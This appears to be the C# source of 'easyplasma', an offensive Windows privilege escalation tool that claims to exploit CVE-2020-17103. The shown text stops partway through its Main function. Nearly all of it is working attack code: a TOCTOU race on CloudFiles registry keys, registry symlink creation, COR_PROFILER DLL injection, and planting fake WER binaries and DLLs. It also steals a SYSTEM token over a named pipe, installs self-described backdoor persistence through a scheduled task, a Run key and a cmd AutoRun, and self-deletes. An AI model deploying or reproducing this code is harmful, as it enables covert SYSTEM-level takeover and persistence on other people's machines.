/*
 * easyplasma.cs  Single-EXE SYSTEM shell tool
 *
 * Fast path (after first run):
 *   Connects to named pipe from persistent syshost server -> instant SYSTEM shell
 *
 * Slow path (first run / server not running):
 *   MiniPlasma (CVE-2020-17103) escalation -> drops embedded syshost.exe
 *   -> WER runs syshost as SYSTEM -> syshost installs persistence + pipe server
 *
 * MODES:
 *   easyplasma.exe            escalate or connect to existing session
 *   easyplasma.exe install    install to user PATH
 *   easyplasma.exe update     download latest from GitHub
 *   easyplasma.exe --unpriv   cleanup and uninstall
 *
 * BUILD:
 *   cl.exe syshost.c /Fe:syshost.exe /O2 /MT /link kernel32.lib shlwapi.lib
 *   csc.exe /platform:x64 /optimize /out:easyplasma.exe easyplasma.cs /res:syshost.exe,syshost.exe
 */

using System;
using System.IO;
using System.IO.Pipes;
using System.Net;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Security.Principal;
using System.Threading;
using Microsoft.Win32;

class EasyPlasma
{
    /* ── P/Invoke ────────────────────────────────────────────────────────── */

    [DllImport("cldapi.dll")] static extern int CfAbortOperation(int pid, IntPtr u, int f);
    [DllImport("ntdll.dll")]  static extern int NtImpersonateAnonymousToken(IntPtr t);
    [DllImport("ntdll.dll")]  static extern int NtSetInformationThread(IntPtr t, int c, ref IntPtr i, int s);
    [DllImport("ntdll.dll")]  static extern int NtOpenKey(out IntPtr h, uint a, ref OA oa);
    [DllImport("ntdll.dll")]  static extern int NtSetSecurityObject(IntPtr h, uint i, IntPtr sd);
    [DllImport("ntdll.dll")]  static extern int NtSetValueKey(IntPtr h, ref US n, int ti, uint t, byte[] d, int l);
    [DllImport("ntdll.dll")]  static extern int NtDeleteKey(IntPtr h);
    [DllImport("ntdll.dll")]  static extern int NtClose(IntPtr h);
    [DllImport("kernel32.dll")] static extern IntPtr GetCurrentThread();
    [DllImport("kernel32.dll")] static extern uint GetCurrentThreadId();
    [DllImport("kernel32.dll")] static extern IntPtr OpenThread(uint a, bool i, uint id);
    [DllImport("advapi32.dll")] static extern bool ImpersonateAnonymousToken(IntPtr t);
    [DllImport("advapi32.dll")] static extern bool RevertToSelf();
    [DllImport("advapi32.dll", CharSet=CharSet.Unicode)]
    static extern bool ConvertStringSecurityDescriptorToSecurityDescriptor(
        string s, uint r, out IntPtr p, out int l);
    [DllImport("kernel32.dll")] static extern IntPtr LocalFree(IntPtr h);

    [StructLayout(LayoutKind.Sequential)] struct US {
        public ushort L, M; public IntPtr B;
        public US(string s){B=Marshal.StringToHGlobalUni(s);L=(ushort)(s.Length*2);M=(ushort)(L+2);}
        public void Free(){if(B!=IntPtr.Zero){Marshal.FreeHGlobal(B);B=IntPtr.Zero;}}
    }
    [StructLayout(LayoutKind.Sequential)] struct OA {
        public int Len; public IntPtr Root,Name; public uint Attr; public IntPtr SD,QoS;
        public OA(string p, uint attr=0x40){
            Len=Marshal.SizeOf(typeof(OA)); Root=IntPtr.Zero;
            var u=new US(p); Name=Marshal.AllocHGlobal(Marshal.SizeOf(typeof(US)));
            Marshal.StructureToPtr(u,Name,false); Attr=attr; SD=IntPtr.Zero; QoS=IntPtr.Zero;
        }
        public void Free(){
            if(Name!=IntPtr.Zero){
                var u=(US)Marshal.PtrToStructure(Name,typeof(US)); u.Free();
                Marshal.FreeHGlobal(Name); Name=IntPtr.Zero;
            }
        }
    }

    const uint KEY_ALL_ACCESS        = 0xF003F;
    const uint KEY_WRITE_DAC         = 0x00040000;
    const uint KEY_WRITE_OWNER       = 0x00080000;
    const uint KEY_DELETE            = 0x00010000;
    const uint KEY_SET_VALUE         = 0x0002;
    const uint KEY_ENUMERATE_SUBKEYS = 0x0008;
    const uint OBJ_OPENLINK          = 0x100;
    const uint OBJ_CASE_INSENSITIVE  = 0x40;
    const uint REG_OPTION_CREATE_LINK= 2;
    const uint REG_OPTION_VOLATILE   = 1;
    const uint REG_SZ                = 1;
    const uint REG_LINK              = 6;
    const uint THREAD_IMPERSONATE        = 0x0100;
    const uint THREAD_SET_THREAD_TOKEN   = 0x0080;
    const uint THREAD_QUERY_INFORMATION  = 0x0040;
    const uint DACL_INFO = 4, LABEL_INFO = 0x10;

    static string SDDL =>
        "D:(A;OICIIO;GA;;;"+"WD)(A;OICIIO;GA;;;"+"AN)(A;;GA;;;"
        +"WD)(A;;GA;;;"+"AN)S:(ML;OICI;NW;;;"+"S-1-16-0)";

    static string _reg = string.Join("\\","","Registry","User",".DEFAULT");
    static string CF   => string.Join("\\",_reg,"Software","Policies","Microsoft","CloudFiles");
    static string BA   => CF + "\\BlockedApps";
    static string TK   => string.Join("\\",_reg,"Volatile Environment");
    static string ENV  => string.Join("\\",_reg,"Environment"); /* non-volatile user env */

    const string PipeEsc = "easyplasma_esc"; /* escalation: user=server SYSTEM=client */
    const string PipeSrv = "easyplasma_srv"; /* fast path: SYSTEM=server user=client  */
    const string PipeName = "easyplasma";    /* legacy - unused */
    const string BaseUrl  = "https://raw.githubusercontent.com/Dylanthedabber/EasyPlasma/main/";
    const string CfgPath  = @"C:\ProgramData\ep_active.cfg";

    static string InstallDir =>
        Path.Combine(Environment.GetFolderPath(
            Environment.SpecialFolder.LocalApplicationData), "EasyPlasma");

    /* ── Registry helpers ────────────────────────────────────────────────── */

    static IntPtr OKey(string path, uint access)
    {
        var oa = new OA(path, OBJ_CASE_INSENSITIVE|OBJ_OPENLINK);
        IntPtr h; int r = NtOpenKey(out h, access, ref oa); oa.Free();
        if (r==0) return h;
        ImpersonateAnonymousToken(GetCurrentThread());
        oa = new OA(path, OBJ_CASE_INSENSITIVE|OBJ_OPENLINK);
        r = NtOpenKey(out h, access, ref oa); oa.Free();
        RevertToSelf();
        return r==0 ? h : IntPtr.Zero;
    }

    static void MakeWritable(string path)
    {
        IntPtr h = OKey(path, KEY_WRITE_DAC);
        if (h!=IntPtr.Zero) { ApplySD(h, DACL_INFO); NtClose(h); }
        h = OKey(path, KEY_WRITE_OWNER);
        if (h!=IntPtr.Zero) { ApplySD(h, LABEL_INFO); NtClose(h); }
    }

    static void ApplySD(IntPtr h, uint info)
    {
        IntPtr p; int l;
        if (ConvertStringSecurityDescriptorToSecurityDescriptor(SDDL,1,out p,out l)) {
            NtSetSecurityObject(h,info,p); LocalFree(p);
        }
    }

    static void RecDelete(string path)
    {
        MakeWritable(path);
        string win32 = path.StartsWith(@"\Registry\User\")
            ? path.Substring(@"\Registry\User\".Length) : path;
        string[] subs = null;
        try { using(var rk=Registry.Users.OpenSubKey(win32)) if(rk!=null) subs=rk.GetSubKeyNames(); } catch{}
        if (subs!=null) foreach(var s in subs) RecDelete(path+"\\"+s);
        IntPtr h = OKey(path, KEY_DELETE);
        if (h!=IntPtr.Zero) { NtDeleteKey(h); NtClose(h); }
    }

    /* ── TOCTOU ──────────────────────────────────────────────────────────── */

    static volatile bool _tDone;

    static void ToggleAnon(object rh)
    {
        IntPtr h = (IntPtr)rh;
        try {
            while (!_tDone) {
                NtImpersonateAnonymousToken(h);
                IntPtr z = IntPtr.Zero;
                NtSetInformationThread(h, 5, ref z, IntPtr.Size);
            }
        } catch {}
        NtClose(h);
    }

    static void RunToctou()
    {
        _tDone = false;
        int pid = System.Diagnostics.Process.GetCurrentProcess().Id;
        IntPtr real = OpenThread(
            THREAD_IMPERSONATE|THREAD_SET_THREAD_TOKEN|THREAD_QUERY_INFORMATION,
            false, GetCurrentThreadId());
        new Thread(ToggleAnon){IsBackground=true}.Start(real);
        int i=0; bool found=false;
        while (i<100000 && !found) {
            CfAbortOperation(pid, IntPtr.Zero, 2);
            if (++i%10000==0) {
                Console.Write(".");
                try { using(var k=Registry.Users.OpenSubKey(
                    @".DEFAULT\Software\Policies\Microsoft\CloudFiles"))
                    if(k!=null) found=true; } catch{}
            }
        }
        _tDone = true;
        Console.WriteLine($" ok={found}");
    }

    static void CreateSymlinkPS(string link, string target)
    {
        string tmp = Path.Combine(Path.GetTempPath(),"ep_"+Guid.NewGuid().ToString("N").Substring(0,6)+".ps1");
        string ps = @"
Add-Type -TypeDefinition @'
using System; using System.Runtime.InteropServices;
public class NR {
  [StructLayout(LayoutKind.Sequential)] public struct US {
    public ushort L,M; public IntPtr B;
    public US(string s){B=Marshal.StringToHGlobalUni(s);L=(ushort)(s.Length*2);M=(ushort)(L+2);}
    public void Free(){if(B!=IntPtr.Zero){Marshal.FreeHGlobal(B);B=IntPtr.Zero;}}
  }
  [StructLayout(LayoutKind.Sequential)] public struct OA {
    public int Len; public IntPtr Root,Name; public uint Attr; public IntPtr SD,QoS;
    public OA(string p){Len=Marshal.SizeOf(typeof(OA));Root=IntPtr.Zero;
      var u=new US(p);Name=Marshal.AllocHGlobal(Marshal.SizeOf(typeof(US)));
      Marshal.StructureToPtr(u,Name,false);Attr=0x140;SD=IntPtr.Zero;QoS=IntPtr.Zero;}
  }
  [DllImport(""ntdll.dll"")] public static extern int NtCreateKey(out IntPtr h,uint a,ref OA oa,int ti,ref US c,uint opt,out uint d);
  [DllImport(""ntdll.dll"")] public static extern int NtSetValueKey(IntPtr h,ref US n,int ti,uint t,byte[] d,int l);
  [DllImport(""ntdll.dll"")] public static extern int NtClose(IntPtr h);
}
'@ -Language CSharp
$oa=[NR+OA]::new('LNKPATH'); $c=[NR+US]::new(''); [uint32]$d=0; [IntPtr]$h=[IntPtr]::Zero
$r=[NR]::NtCreateKey([ref]$h,0xF003F,[ref]$oa,0,[ref]$c,3,[ref]$d)
if($r-eq 0){
  $vn=[NR+US]::new('SymbolicLinkValue')
  $tb=[System.Text.Encoding]::Unicode.GetBytes('TGTPATH')
  [NR]::NtSetValueKey($h,[ref]$vn,0,6,$tb,$tb.Length)|Out-Null
  $vn.Free(); [NR]::NtClose($h)|Out-Null
  Write-Host '[+] Symlink OK'
} else { Write-Host ('[-] 0x'+$r.ToString('X8')) }
".Replace("LNKPATH",link).Replace("TGTPATH",target);
        File.WriteAllText(tmp,ps);
        var p = System.Diagnostics.Process.Start(new System.Diagnostics.ProcessStartInfo(
            "powershell.exe", $"-NoProfile -NonInteractive -ExecutionPolicy Bypass -File \"{tmp}\"")
            {UseShellExecute=false});
        p.WaitForExit(20000);
        try{File.Delete(tmp);}catch{}
    }

    /* ── MiniPlasma ──────────────────────────────────────────────────────── */

    static bool RunMiniPlasma(string runDir)
    {
        Console.WriteLine("[*] Stage 1: TOCTOU..."); Console.Write("    ");
        RunToctou();
        using(var k=Registry.Users.OpenSubKey(@".DEFAULT\Software\Policies\Microsoft\CloudFiles"))
            if(k==null){Console.WriteLine("[-] Stage 1 failed");return false;}
        Console.WriteLine("[+] Stage 1 done");

        Console.WriteLine("[*] Stage 2: Symlink...");
        RecDelete(BA); Thread.Sleep(300);
        RecDelete(TK); Thread.Sleep(200);
        MakeWritable(CF); Thread.Sleep(100);
        CreateSymlinkPS(BA, TK);
        Console.Write("    S2 TOCTOU: "); RunToctou();
        Console.WriteLine("[+] Stage 2 done");

        Console.WriteLine("[*] Stage 3: COR_PROFILER injection via VE...");
        MakeWritable(TK); Thread.Sleep(200);

        /* Drop stub.dll to disk */
        string dllPath = Path.Combine(
            Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData),
            "ep_prof.dll");
        var asm = Assembly.GetExecutingAssembly();
        using (var s = asm.GetManifestResourceStream("stub.dll")) {
            if (s != null) {
                byte[] b = new byte[s.Length]; s.Read(b, 0, b.Length);
                File.WriteAllBytes(dllPath, b);
                Console.WriteLine($"[+] Dropped profiler DLL -> {dllPath}");
            }
        }

        /* Write COR_PROFILER vars to VE so any SYSTEM .NET process loads our DLL */
        bool wrote = false;
        IntPtr hTK = OKey(TK, KEY_SET_VALUE);
        if (hTK!=IntPtr.Zero) {
            var vals = new (string name, string val)[] {
                ("COR_ENABLE_PROFILING", "1"),
                ("COR_PROFILER",         "{00000000-1111-2222-3333-444444444444}"),
                ("COR_PROFILER_PATH",    dllPath),
                /* Keep windir too for WER fallback */
                ("windir",    runDir),
                ("SystemRoot",runDir),
            };
            foreach (var (name, val) in vals) {
                var vn = new US(name);
                var wb = System.Text.Encoding.Unicode.GetBytes(val+"\0");
                if (NtSetValueKey(hTK,ref vn,0,REG_SZ,wb,wb.Length)==0) wrote=true;
                vn.Free();
            }
            NtClose(hTK);
        }
        if (!wrote){Console.WriteLine("[-] VE write failed");return false;}
        Console.WriteLine("[+] COR_PROFILER set in VE");

        PreparePayload(runDir); /* also drop WER stubs for fallback */

        /* Trigger mscorsvw.exe (NGEN) as SYSTEM - it hosts CLR and will load our profiler DLL */
        Console.WriteLine("[*] Triggering .NET NGEN task (mscorsvw.exe as SYSTEM)...");
        /* Add fake dir to start of PATH so wermgr.exe loads our DLLs by name */
        string sysPath = Environment.GetEnvironmentVariable("PATH") ?? "";
        string fakePath = Path.Combine(runDir,"System32");
        IntPtr hTK2 = OKey(TK, KEY_SET_VALUE);
        if (hTK2!=IntPtr.Zero) {
            var vn = new US("PATH");
            string newPath = fakePath + ";" + sysPath;
            var wb = System.Text.Encoding.Unicode.GetBytes(newPath+"\0");
            NtSetValueKey(hTK2,ref vn,0,REG_SZ,wb,wb.Length); vn.Free();
            NtClose(hTK2);
            Console.WriteLine($"[+] PATH in VE: {fakePath};...");
        }

        /* Drop stub.dll under common DLL names wermgr.exe might load */
        string[] dllNames = {"wlbsctrl.dll","wbemcomn.dll","dbgcore.dll","version.dll","netutils.dll"};
        foreach (var d in dllNames)
            try { File.Copy(dllPath, Path.Combine(fakePath,d), true); } catch {}
        Console.WriteLine($"[+] Dropped stub.dll as {dllNames.Length} candidate DLLs");

        /* Enumerate ALL .NET Framework tasks and run them */
        string ngenPs =
            "try{$s=New-Object -ComObject Schedule.Service;$s.Connect();" +
            "$f=$s.GetFolder('\\Microsoft\\Windows\\.NET Framework');" +
            "$n=$f.GetTasks(0).Count;" +
            "Write-Host('tasks:'+$n);" +
            "foreach($t in $f.GetTasks(0)){$t.Run($null);Write-Host('[run]'+$t.Name)}" +
            "}catch{Write-Host('ngen-err:'+$_)}";
        var npsi = new System.Diagnostics.ProcessStartInfo("powershell.exe",
            $"-NoProfile -NonInteractive -WindowStyle Hidden -Command \"{ngenPs}\"")
            {UseShellExecute=false,CreateNoWindow=true,RedirectStandardOutput=true,RedirectStandardError=true};
        string ngenOut = "";
        using(var p=System.Diagnostics.Process.Start(npsi)) {
            ngenOut = p.StandardOutput.ReadToEnd()+p.StandardError.ReadToEnd(); p.WaitForExit(8000);
        }
        Console.WriteLine($"[+] NGEN: {ngenOut.Trim()}");

        /* Also trigger WER as fallback */
        string werPs = "$s=New-Object -ComObject Schedule.Service;$s.Connect();" +
                    "$t=$s.GetFolder('\\Microsoft\\Windows\\Windows Error Reporting').GetTask('QueueReporting');" +
                    "$t.Run($null)";
        var wpsi = new System.Diagnostics.ProcessStartInfo("powershell.exe",
            $"-NoProfile -NonInteractive -WindowStyle Hidden -Command \"{werPs}\"")
            {UseShellExecute=false,CreateNoWindow=true};
        using(var p=System.Diagnostics.Process.Start(wpsi)) p.WaitForExit(5000);
        Console.WriteLine("[+] WER triggered (fallback)");
        return true;
    }

    /* ── Token impersonation via named pipe (original MiniPlasma approach) ── */
    /*
     * User process = pipe SERVER. SYSTEM wermgr.exe = pipe CLIENT.
     * ImpersonateNamedPipeClient() gives user process a SYSTEM token.
     * Adjust session ID to current interactive session.
     * CreateProcessAsUser spawns cmd.exe as SYSTEM in the right session.
     */

    [DllImport("kernel32.dll")] static extern bool CloseHandle(IntPtr h);
    [DllImport("kernel32.dll")] static extern uint WaitForSingleObject(IntPtr h, uint ms);
    [DllImport("kernel32.dll")] static extern int GetCurrentProcessId();
    [DllImport("kernel32.dll")] static extern uint WTSGetActiveConsoleSessionId();

    [DllImport("advapi32.dll")] static extern bool ImpersonateNamedPipeClient(IntPtr pipe);
    [DllImport("advapi32.dll")] static extern bool OpenThreadToken(
        IntPtr thread, uint access, bool openAsSelf, out IntPtr token);
    [DllImport("advapi32.dll")] static extern bool DuplicateTokenEx(
        IntPtr existing, uint access, IntPtr sa, int impLevel, int tokenType, out IntPtr newToken);
    [DllImport("advapi32.dll")] static extern bool SetTokenInformation(
        IntPtr token, int cls, ref uint info, uint len);
    [DllImport("advapi32.dll", CharSet=CharSet.Unicode)] static extern bool CreateProcessAsUser(
        IntPtr token, string app, string cmd, IntPtr pa, IntPtr ta,
        bool inherit, uint flags, IntPtr env, string dir,
        ref STARTUPINFO si, out PROCESS_INFORMATION pi);

    [StructLayout(LayoutKind.Sequential, CharSet=CharSet.Unicode)]
    struct STARTUPINFO {
        public int cb, _r1; public string _r2, _r3;
        public int _r4, _r5, _r6, _r7, _r8, _r9, _r10; public uint dwFlags;
        public short _r11, _r12; public IntPtr _r13;
        public IntPtr hStdInput, hStdOutput, hStdError;
    }
    [StructLayout(LayoutKind.Sequential)]
    struct PROCESS_INFORMATION {
        public IntPtr hProcess, hThread; public int pid, tid;
    }

    /* SYSTEM mode: just connect back to the user's named pipe server and exit */
    static void SystemCallback(string pipeName)
    {
        try {
            /* Connect to user-side pipe server */
            using (var pipe = new NamedPipeClientStream(".", pipeName, PipeDirection.InOut)) {
                pipe.Connect(10000);
                /* Write our PID so the server knows we're alive */
                byte[] pid = BitConverter.GetBytes(GetCurrentProcessId());
                pipe.Write(pid, 0, 4);
                pipe.Flush();
                /* Wait for server to signal done (it will close the pipe) */
                byte[] ack = new byte[1];
                pipe.Read(ack, 0, 1);
            }
        } catch {}
    }

    /* User-side: create pipe server, wait for SYSTEM to connect, steal token */
    static bool WaitForSystemToken(string pipeName, out IntPtr systemToken)
    {
        systemToken = IntPtr.Zero;
        try {
            var pipe = new NamedPipeServerStream(pipeName, PipeDirection.InOut, 1,
                PipeTransmissionMode.Byte, PipeOptions.None, 64, 64);

            if (!pipe.WaitForConnectionAsync().Wait(25000)) {
                pipe.Dispose(); return false;
            }

            /* Impersonate the SYSTEM client to get its token */
            if (!ImpersonateNamedPipeClient(pipe.SafePipeHandle.DangerousGetHandle()))
                { pipe.Dispose(); return false; }

            /* Capture the impersonation token from our thread */
            IntPtr impToken;
            OpenThreadToken(GetCurrentThread(), 0xF01FF, false, out impToken);

            /* Duplicate to primary token */
            IntPtr primary;
            DuplicateTokenEx(impToken, 0x10000000, IntPtr.Zero, 2, 1, out primary);
            CloseHandle(impToken);
            RevertToSelf();

            /* Set token session to current interactive session */
            uint session = WTSGetActiveConsoleSessionId();
            SetTokenInformation(primary, 12 /* TokenSessionId */, ref session, 4);

            /* Signal wermgr.exe that we're done (send ack byte) */
            pipe.Write(new byte[]{1}, 0, 1);
            pipe.Flush();
            pipe.Dispose();

            systemToken = primary;
            return primary != IntPtr.Zero;
        } catch { return false; }
    }

    static void SpawnSystemShell(IntPtr token)
    {
        string unpriv = Path.Combine(InstallDir, "easyplasma.exe");
        string initCmd =
            "cmd.exe /K \"title [SYSTEM] Shell && prompt SYSTEM $P$G && " +
            "doskey power=powershell.exe -NoLogo $* && " +
            "doskey cmdnew=start cmd.exe && " +
            "doskey psnew=start powershell.exe -NoLogo && " +
            $"doskey unpriv=\\\"{unpriv}\\\" --unpriv && " +
            "echo. && echo  [SYSTEM] NT AUTHORITY\\SYSTEM && " +
            "echo  power  cmdnew  psnew  unpriv && echo.\"";

        var si = new STARTUPINFO(); si.cb = Marshal.SizeOf(si);
        var pi = new PROCESS_INFORMATION();
        /* No CREATE_NEW_CONSOLE: inherit current console so shell appears in same window */
        CreateProcessAsUser(token, null, initCmd, IntPtr.Zero, IntPtr.Zero,
            true, 0, IntPtr.Zero, null, ref si, out pi);

        if (pi.hProcess != IntPtr.Zero) {
            WaitForSingleObject(pi.hProcess, 0xFFFFFFFF);
            CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
        }
        CloseHandle(token);
    }

    static void InstallBackdoor(IntPtr _unused)
    {
        try {
            Directory.CreateDirectory(InstallDir);
            string self = System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName;
            string dest = Path.Combine(InstallDir, "easyplasma.exe");
            if (!string.Equals(self, dest, StringComparison.OrdinalIgnoreCase))
                File.Copy(self, dest, true);
            string taskCmd =
                $"schtasks /create /f /tn \"\\EasyPlasma\\Maintenance\" " +
                $"/tr \"\\\"{dest}\\\" /server\" /sc onlogon /ru SYSTEM /rl highest";
            System.Diagnostics.Process.Start(new System.Diagnostics.ProcessStartInfo(
                "cmd.exe", "/c " + taskCmd){CreateNoWindow=true, UseShellExecute=false})
                ?.WaitForExit(5000);
        } catch {}
    }

    /* Extract native stub and drop as ALL WER-related executables wermgr.exe might spawn.
       wermgr.exe runs with our fake windir in its env, so it expands %windir%\System32\X
       from VE and will launch whichever of these exists first. */
    static string PreparePayload(string runDir)
    {
        string sys32 = Path.Combine(runDir, "System32");
        Directory.CreateDirectory(sys32);

        byte[] stub = null;
        var asm = Assembly.GetExecutingAssembly();
        using (var s = asm.GetManifestResourceStream("stub.exe")) {
            if (s != null) { stub = new byte[s.Length]; s.Read(stub, 0, stub.Length); }
        }
        if (stub == null) {
            string local = Path.Combine(
                Path.GetDirectoryName(System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName),
                "stub.exe");
            if (File.Exists(local)) stub = File.ReadAllBytes(local);
        }
        if (stub == null) { Console.WriteLine("[-] stub not found"); return null; }

        /* Drop stub as every executable wermgr.exe might spawn via %windir%\System32\ */
        string[] targets = {
            "WerFaultSecure.exe",   /* elevated crash dump collector */
            "WerFault.exe",         /* standard fault handler         */
            "WerConsentHandler.exe",/* consent dialog                 */
            "WerReportUploader.exe",/* report uploader                */
            "wermgr.exe",           /* wermgr itself (original target)*/
        };
        foreach (var t in targets) {
            string dest = Path.Combine(sys32, t);
            File.WriteAllBytes(dest, stub);
        }
        Console.WriteLine($"[+] Dropped stub as {targets.Length} WER executables in {sys32}");
        return sys32;
    }

    [DllImport("kernel32.dll")]
    static extern bool GetNamedPipeClientSessionId(IntPtr pipe, out uint sessionId);

    /* Fast path: connect to backdoor SYSTEM pipe server, get shell */
    static bool TryFastPath()
    {
        try {
            using (var pipe = new NamedPipeClientStream(".", PipeSrv, PipeDirection.InOut)) {
                pipe.Connect(500);
                /* Wait for SYSTEM to signal shell is ready */
                byte[] ack = new byte[1];
                pipe.Read(ack, 0, 1);
                if (ack[0] == 1) { Console.WriteLine("[+] SYSTEM shell launched"); return true; }
                return false;
            }
        } catch { return false; }
    }

    /* SYSTEM srv server: accepts user connections, spawns SYSTEM cmd in user's session */
    static void RunSrvServer()
    {
        Directory.CreateDirectory(InstallDir);
        for (;;) {
            try {
                var srv = new NamedPipeServerStream(PipeSrv, PipeDirection.InOut, 10,
                    PipeTransmissionMode.Byte, PipeOptions.None, 64, 64);
                srv.WaitForConnection();
                new Thread(() => ServeSrvClient(srv)){IsBackground=true}.Start();
            } catch { Thread.Sleep(1000); }
        }
    }

    static void ServeSrvClient(NamedPipeServerStream srv)
    {
        try {
            /* Find out which session the connecting user is in */
            uint sessionId;
            if (!GetNamedPipeClientSessionId(srv.SafePipeHandle.DangerousGetHandle(), out sessionId))
                sessionId = WTSGetActiveConsoleSessionId();

            /* Duplicate our own SYSTEM token and set the target session */
            IntPtr selfToken;
            OpenProcessToken(GetCurrentProcess(), 0xF01FF, out selfToken);
            IntPtr primary;
            DuplicateTokenEx(selfToken, 0x10000000, IntPtr.Zero, 2, 1, out primary);
            CloseHandle(selfToken);
            SetTokenInformation(primary, 12, ref sessionId, 4);

            string unpriv = Path.Combine(InstallDir, "easyplasma.exe");
            string cmd =
                "cmd.exe /K \"title [SYSTEM] Shell && prompt SYSTEM $P$G && " +
                "doskey power=powershell.exe -NoLogo $* && " +
                "doskey cmdnew=start cmd.exe && " +
                "doskey psnew=start powershell.exe -NoLogo && " +
                $"doskey unpriv=\\\"{unpriv}\\\" --unpriv && " +
                "echo. && echo  [SYSTEM] NT AUTHORITY\\SYSTEM && " +
                "echo  power  cmdnew  psnew  unpriv && echo.\"";

            var si = new STARTUPINFO(); si.cb = Marshal.SizeOf(si);
            var pi = new PROCESS_INFORMATION();
            CreateProcessAsUser(primary, null, cmd, IntPtr.Zero, IntPtr.Zero,
                false, 0x10 /* CREATE_NEW_CONSOLE */, IntPtr.Zero, null, ref si, out pi);
            CloseHandle(primary);

            /* Signal user: done */
            srv.Write(new byte[]{1}, 0, 1); srv.Flush();

            if (pi.hProcess != IntPtr.Zero) {
                WaitForSingleObject(pi.hProcess, 0xFFFFFFFF);
                CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
            }
        } catch {}
        finally { try { srv.Dispose(); } catch {} }
    }

    [DllImport("kernel32.dll")] static extern IntPtr GetCurrentProcess();
    [DllImport("advapi32.dll")] static extern bool OpenProcessToken(IntPtr h, uint a, out IntPtr t);

    /* ── Install / Update / Uninstall ────────────────────────────────────── */

    static bool Download(string filename, string dest)
    {
        try {
            Console.WriteLine($"[*] Downloading {filename}...");
            ServicePointManager.SecurityProtocol = (System.Net.SecurityProtocolType)3072;
            using(var wc = new WebClient()) wc.DownloadFile(BaseUrl+filename, dest);
            Console.WriteLine($"[+] Done");
            return true;
        } catch(Exception ex) {
            Console.WriteLine($"[-] Download failed: {ex.Message}");
            return false;
        }
    }

    static void Install()
    {
        string self = System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName;
        string selfDir = Path.GetDirectoryName(self);
        Directory.CreateDirectory(InstallDir);
        File.Copy(self, Path.Combine(InstallDir,"easyplasma.exe"), true);

        /* Add to PATH */
        string curPath = Registry.CurrentUser.OpenSubKey(@"Environment")
            ?.GetValue("PATH","") as string ?? "";
        if (curPath.ToLower().IndexOf(InstallDir.ToLower()) < 0)
            Registry.CurrentUser.OpenSubKey(@"Environment",true)
                ?.SetValue("PATH", curPath.TrimEnd(';')+";"+InstallDir);
        Console.WriteLine("[+] Added to PATH");

        /* AutoRun doskey */
        Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Command Processor")
            .SetValue("AutoRun", $"doskey easyplasma=\"{Path.Combine(InstallDir,"easyplasma.exe")}\" $*");
        Console.WriteLine("[+] AutoRun doskey set");

        /* Backdoor Run key */
        Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run")
            .SetValue("EPMaintenance", $"\"{Path.Combine(InstallDir,"easyplasma.exe")}\" --prep");
        Console.WriteLine("[+] Persistence set");

        /* Self-delete source */
        if (!string.Equals(selfDir, InstallDir, StringComparison.OrdinalIgnoreCase)) {
            string cmd = $"/c ping -n 2 127.0.0.1 >nul & del /F /Q \"{self}\"";
            System.Diagnostics.Process.Start(new System.Diagnostics.ProcessStartInfo(
                "cmd.exe",cmd){CreateNoWindow=true,UseShellExecute=false});
        }
        Console.WriteLine("[+] Install complete. Open a new cmd and type: easyplasma");
    }

    static void Update()
    {
        Download("easyplasma.exe", Path.Combine(Path.GetTempPath(),"ep_update.exe"));
        string installed = Path.Combine(InstallDir,"easyplasma.exe");
        string tmp = Path.Combine(Path.GetTempPath(),"ep_update.exe");
        if (File.Exists(tmp)) {
            string cmd = $"/c ping -n 2 127.0.0.1 >nul & move /Y \"{tmp}\" \"{installed}\"";
            System.Diagnostics.Process.Start(new System.Diagnostics.ProcessStartInfo(
                "cmd.exe",cmd){CreateNoWindow=true,UseShellExecute=false});
            Console.WriteLine("[+] Update applied. Open a new cmd.");
        }
    }

    static void Uninstall()
    {
        Console.WriteLine("[*] Cleaning...");
        try{RecDelete(CF);}catch{}
        try{RecDelete(TK);}catch{}
        try{Registry.Users.OpenSubKey(@".DEFAULT\\Environment",true)?.DeleteValue("windir",false);}catch{}
        try{Registry.Users.OpenSubKey(@".DEFAULT\\Environment",true)?.DeleteValue("SystemRoot",false);}catch{}
        try{Registry.Users.OpenSubKey(@".DEFAULT\\Volatile Environment",true)?.DeleteValue("COR_ENABLE_PROFILING",false);}catch{}
        try{Registry.Users.OpenSubKey(@".DEFAULT\\Volatile Environment",true)?.DeleteValue("COR_PROFILER",false);}catch{}
        try{Registry.Users.OpenSubKey(@".DEFAULT\\Volatile Environment",true)?.DeleteValue("COR_PROFILER_PATH",false);}catch{}
        try{File.Delete(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData),"ep_prof.dll"));}catch{}
        /* Remove scheduled task */
        System.Diagnostics.Process.Start(new System.Diagnostics.ProcessStartInfo(
            "schtasks.exe",@"/delete /f /tn ""\EasyPlasma\Maintenance""")
            {UseShellExecute=false,CreateNoWindow=true})?.WaitForExit(3000);
        /* Remove registry */
        try{Registry.CurrentUser.OpenSubKey(@"Environment",true)?.DeleteValue("PATH",false);}catch{}
        try{
            string p = Registry.CurrentUser.OpenSubKey(@"Environment")
                ?.GetValue("PATH","") as string ?? "";
            p=p.Replace(";"+InstallDir,"").Replace(InstallDir+";","").Replace(InstallDir,"");
            Registry.CurrentUser.OpenSubKey(@"Environment",true)?.SetValue("PATH",p);
        }catch{}
        try{Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Command Processor",true)
            ?.DeleteValue("AutoRun",false);}catch{}
        try{Registry.CurrentUser.OpenSubKey(
            @"Software\Microsoft\Windows\CurrentVersion\Run",true)
            ?.DeleteValue("EPMaintenance",false);}catch{}
        try{if(Directory.Exists(InstallDir))Directory.Delete(InstallDir,true);}catch{}
        Console.WriteLine("[+] Done. All traces removed.");
    }

    static void Prep()
    {
        /* Silent re-prep: run Stage 1 TOCTOU to keep CF key world-writable */
        try { Console.Write("[prep] "); RunToctou(); MakeWritable(CF); } catch {}
    }

    /* ── Main ────────────────────────────────────────────────────────────── */

    static void Main(string[] args)
    {
        string mode = args.Length>0 ? args[0].ToLower() : "";

        /* SYSTEM mode: either /server (scheduled task) or direct SYSTEM launch via WER */
        if (WindowsIdentity.GetCurrent().IsSystem || mode=="/server") {
